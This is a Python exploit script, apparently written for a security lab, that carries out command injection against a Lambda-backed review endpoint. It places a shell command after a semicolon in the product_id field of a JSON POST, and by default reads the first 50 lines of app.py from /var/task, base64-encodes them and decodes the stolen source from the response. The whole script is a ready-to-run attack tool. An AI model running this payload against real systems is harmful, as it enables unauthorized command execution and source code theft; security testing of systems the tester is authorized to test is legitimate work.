import requests
import json
import base64
import argparse
import random

def command_injection_attack(url, command):
    """
    Executes command injection attack against vulnerable Lambda function
    
    Args:
        url: Target endpoint URL
        command: Command to inject
    """
    print(f"Attempting command injection against: {url}")
    print(f"Injecting command: {command}")
    
    # Always use a valid, non-empty product_id and inject the command
    injected_product_id = f"exploit_{random.randint(1000,9999)}; {command}"

    payload = {
        "product_id": injected_product_id,
        "review": "This is a test review",
        "username": "test_user"
    }
    
    print("Payload being sent:", json.dumps(payload))
    
    # Send the request
    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"\nResponse status code: {response.status_code}")
        
        if response.status_code == 200:
            result = response.json()
            print("\nResponse content:")
            print(json.dumps(result, indent=2))
            
            # Look for base64 content in the response
            output = result.get('product_check', '')
            if output:
                try:
                    # Try to detect and decode potential base64 data
                    decoded = base64.b64decode(output.strip()).decode('utf-8')
                    print("\nDecoded content:")
                    print("=" * 50)
                    print(decoded)
                    print("=" * 50)
                except Exception as e:
                    print("Base64 decode error:", e)
                    print("Raw output:", output)
        else:
            print("\nFailed to execute command injection")
            print(response.text)
    
    except Exception as e:
        print(f"Error: {str(e)}")

    print("Parsed product_id:", injected_product_id)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Command Injection Attack Demonstration Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--command", default="cd /var; cd task; f=$(head -50 app.py|base64 --wrap=0); echo $f", 
                        help="Command to inject")
    
    args = parser.parse_args()
    command_injection_attack(args.url, args.command)